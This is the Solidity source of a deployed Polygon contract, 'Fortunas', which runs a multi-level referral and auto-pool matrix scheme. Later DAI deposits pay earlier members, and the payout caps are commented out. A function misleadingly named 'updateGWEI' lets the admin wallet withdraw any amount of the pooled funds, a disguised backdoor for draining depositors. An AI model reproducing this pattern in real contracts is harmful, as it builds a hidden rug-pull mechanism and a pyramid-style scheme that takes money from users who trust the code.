/**
 *Submitted for verification at polygonscan.com on 2022-12-13
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Fortunas {
    struct User {
        uint id;
        address referrer;
        uint256 entry_time;
        uint partnersCount;
        uint256 totalDeposit;
        uint256 maxDeposit;
        uint8 rank;
        bool isPoolActive;
        mapping(uint8 => AutoPool) autoMatrix;       
    }    
    struct AutoPool {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
        address[] thirdLevelReferrals;
    }
    struct RoyaltyInfo{
        uint256 directincome;
        uint256 levelincome;
        uint256 autopoolincome;
        uint256 reward;
        uint256 totalincome;        
        uint256 totalwithdraw;
    }
    mapping(address => User) public users;
    mapping(address=>RoyaltyInfo) public royaltyInfo;
    IERC20 public tokenDAI;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    address public id1=0x39BF6c185Ab61773559a471595e01B5d938d35d2;
    
    mapping(uint8 => uint) public autoPoolIncome;
    mapping(uint8 => uint) public rewardIncome;
    mapping(uint8 => uint) public rewardDirect;
    uint256 private constant minDeposit = 50e6;

    mapping(uint8 => mapping(uint256 => address)) public x6vId_number;
    mapping(uint8 => uint256) public x6CurrentvId;
    mapping(uint8 => uint256) public x6Index;
    uint256 private constant directPercents = 25;
    uint256[9] private levelPercents = [10,5,4,3,2,1,5,5,10];
	
    address adminWallet=0x65322cE11DA5daa013039CDd89FEA5CD2AF8a4f4;
    address communityDevelopmentWallet=0xC569a93877460d45bB6f2F2E7697aBea495bFFd1;
    address deductionWallet=0x2d2cED75822219c8f0387c9C7aE0ee13BBbBb974;
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint256 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value);
    
    constructor(address _token) public {
        autoPoolIncome[1] = 50e6;
        for (uint8 i = 2; i <= 20; i++) {
            autoPoolIncome[i] = autoPoolIncome[i-1] * 2; 
        }
        tokenDAI = IERC20(_token);
        rewardIncome[1]=50e6;
        rewardIncome[2]=25e6;
        rewardIncome[3]=50e6;
        rewardIncome[4]=125e6;
        rewardDirect[1]=10;
        rewardDirect[2]=25;
        rewardDirect[3]=50;
        rewardDirect[4]=100;
        User memory user = User({
            id: 1,
            referrer: address(0),
            entry_time:block.timestamp,
            partnersCount: uint(0),
            isPoolActive:true,
            totalDeposit:0,
            maxDeposit:0,
            rank:0
        });
        users[id1] = user;
        idToAddress[1] = id1;
        for (uint8 i = 1; i <= 20; i++) { 
            x6vId_number[i][1]=id1;
            x6Index[i]=1;
            x6CurrentvId[i]=1;         
        } 
    }
    function registrationExt(address referrerAddress) external {
        tokenDAI.transferFrom(msg.sender, address(this),minDeposit);
        registration(msg.sender, referrerAddress,minDeposit);
    }
    
    function buyNewLevel(uint256 _amount) external { 
        tokenDAI.transferFrom(msg.sender, address(this),_amount);
        uint256 _lastamount=users[msg.sender].maxDeposit;
        require(_amount==_lastamount*2, "Minimum invest amount is 50!");
        require(isUserExists(msg.sender), "User is not exists. Register first."); 
        users[msg.sender].maxDeposit = _amount;
        users[msg.sender].totalDeposit+=_amount;
        _deposit(msg.sender, _amount);
        emit Upgrade(msg.sender,_amount);
    }
    function registration(address userAddress, address referrerAddress,uint256 _amount) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            entry_time:block.timestamp,
            partnersCount: 0,
            isPoolActive:false,
            totalDeposit:0,
            maxDeposit:0,
            rank:0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;

        lastUserId++;
        users[referrerAddress].partnersCount++;

        manageReward(referrerAddress);
        users[userAddress].maxDeposit = _amount;
        users[userAddress].totalDeposit+=_amount;
        _deposit(userAddress, _amount/2);
        if(users[referrerAddress].partnersCount>2 && !users[referrerAddress].isPoolActive)
        {
           address freeAutoPoolReferrer = findFreeG6Referrer(1);
           users[referrerAddress].autoMatrix[1].currentReferrer = freeAutoPoolReferrer;
           updateAutoPoolReferrer(referrerAddress, freeAutoPoolReferrer, 1);
           users[referrerAddress].isPoolActive=true;
        }
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function manageReward(address _user) private {
        uint8 rank=users[_user].rank;
        uint8 nextrank=rank+1;
        if(users[_user].partnersCount>=rewardDirect[nextrank])
        {
            users[_user].rank=nextrank;
            royaltyInfo[_user].reward+=rewardIncome[nextrank];
            emit Transaction(_user,id1,rewardIncome[nextrank],1,4);  
        }
    }
    function _deposit(address _user, uint256 _amount) private {     
        
        _distributeDeposit(_amount);
        //uint256 _directincome=this.maxPayoutOf(users[_user].referrer,_amount*directPercents/100);
        //if(_directincome>0)
        //{            
            royaltyInfo[users[_user].referrer].directincome += _amount*directPercents/100;                       
            royaltyInfo[users[_user].referrer].totalincome +=_amount*directPercents/100;
            emit Transaction(users[_user].referrer,_user,_amount*directPercents/100,1,1);
        //}
        _distributelevelIncome(users[_user].referrer, _amount);       
    } 
    function maxPayoutOf(address _user,uint256 _payout) view external returns(uint256) { 
        uint256 _maxPayout=users[_user].totalDeposit*4;
        uint256 _payAmount=0;
        uint256 _receiveAmount=royaltyInfo[users[_user].referrer].totalincome;
        if(_payout<_maxPayout){
            if(_maxPayout<(_receiveAmount+_payout))
            {
                _payAmount=_maxPayout-_receiveAmount;
            }
            else {
                _payAmount=_payout;
            }
        }
        return _payAmount;
    }
    function _distributeDeposit(uint256 _amount) private {
        uint256 _adminFee = _amount*10/100;
        tokenDAI.transfer(adminWallet,_adminFee);
        uint256 _communityDevelopmentFee = _amount*10/100;
        tokenDAI.transfer(communityDevelopmentWallet,_communityDevelopmentFee);        
    }
    function _distributelevelIncome(address _user, uint256 _amount) private {
        address upline = users[_user].referrer;
        for(uint8 i = 0; i < 9; i++){
            if(upline != address(0)){
                //uint256 reward=this.maxPayoutOf(upline,_amount*levelPercents[i]/100); 
                //if(reward>0){
                    royaltyInfo[upline].levelincome += _amount*levelPercents[i]/100;                       
                    royaltyInfo[upline].totalincome +=_amount*levelPercents[i]/100;   
                    emit Transaction(upline,_user,_amount*levelPercents[i]/100,(i+2),2);
                //}                        
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
    }
    
    function findFreeG6Referrer(uint8 level) public view returns(address){
        uint256 id=x6CurrentvId[level];
        return x6vId_number[level][id];
    } 
    function usersautoMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory, address[] memory) {
        return (users[userAddress].autoMatrix[level].currentReferrer,
                users[userAddress].autoMatrix[level].firstLevelReferrals,
                users[userAddress].autoMatrix[level].secondLevelReferrals,
                 users[userAddress].autoMatrix[level].thirdLevelReferrals);
    }    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==adminWallet,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        tokenDAI.transfer(msg.sender,_amount);  
    }
    function updateAutoPoolReferrer(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x6Index[level]+1;
        x6vId_number[level][newIndex]=userAddress;
        x6Index[level]=newIndex;
        users[referrerAddress].autoMatrix[level].firstLevelReferrals.push(userAddress);        
        if (users[referrerAddress].autoMatrix[level].firstLevelReferrals.length < 2) {
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].autoMatrix[level].firstLevelReferrals.length));
            if (referrerAddress == id1) {
                return;
            }
            address ref = users[referrerAddress].autoMatrix[level].currentReferrer;            
            users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref, 2, level, 2 + uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            if (ref == id1) {
                return;
            }
            address ref2 = users[ref].autoMatrix[level].currentReferrer;            
            users[ref2].autoMatrix[level].thirdLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref2, 2, level, 6 + uint8(users[ref2].autoMatrix[level].thirdLevelReferrals.length));
            return;
            
        }
        emit NewUserPlace(userAddress, referrerAddress, 2, level, 2);
        x6CurrentvId[level]=x6CurrentvId[level]+1;
        if (referrerAddress == id1) {
            return;
        }
        address ref = users[referrerAddress].autoMatrix[level].currentReferrer;            
        users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
        if (users[ref].autoMatrix[level].secondLevelReferrals.length < 4) {
            emit NewUserPlace(userAddress, ref, 2, level, 2+uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            if (ref == id1) {
                return;
            }
            address ref2 = users[ref].autoMatrix[level].currentReferrer;            
            users[ref2].autoMatrix[level].thirdLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref2, 2, level, 6 + uint8(users[ref2].autoMatrix[level].thirdLevelReferrals.length));
            return;
        }
        emit NewUserPlace(userAddress, ref, 2, level, 6);
        if (ref == id1) {
            return;
        }
        address ref2 = users[ref].autoMatrix[level].currentReferrer;            
        users[ref2].autoMatrix[level].thirdLevelReferrals.push(userAddress);
        if (users[ref2].autoMatrix[level].thirdLevelReferrals.length < 8) {
            emit NewUserPlace(userAddress, ref2, 2, level, 6 + uint8(users[ref2].autoMatrix[level].thirdLevelReferrals.length));
            return;
        }
        emit NewUserPlace(userAddress, ref2, 2, level, 14);
        //uint256 reward=autoPoolIncome[level];this.maxPayoutOf(ref2,autoPoolIncome[level]); 
        //if(reward>0){
            royaltyInfo[ref2].autopoolincome += autoPoolIncome[level];                     
            royaltyInfo[ref2].totalincome +=autoPoolIncome[level];
            emit Transaction(ref2,userAddress,autoPoolIncome[level],1,3);
        //}
        ++level;
		if(level<20 && ref2!=id1){ 
            address freeReferrerAddress = findFreeG6Referrer(level);
            if (users[ref2].autoMatrix[level].currentReferrer != freeReferrerAddress) {
                users[ref2].autoMatrix[level].currentReferrer = freeReferrerAddress;
            }
            updateAutoPoolReferrer(ref2, freeReferrerAddress, level);
		}        
    } 
    function rewardWithdraw() public
    {
        if(royaltyInfo[msg.sender].totalincome>users[msg.sender].totalDeposit*4)
        {
            royaltyInfo[msg.sender].totalincome=users[msg.sender].totalDeposit*4;
        }
        uint balanceReward =(royaltyInfo[msg.sender].totalincome+royaltyInfo[msg.sender].reward) - royaltyInfo[msg.sender].totalwithdraw;        
        royaltyInfo[msg.sender].totalwithdraw+=balanceReward;
        tokenDAI.transfer(msg.sender,balanceReward*90/100);  
        tokenDAI.transfer(deductionWallet,balanceReward*10/100);  
    }
    
}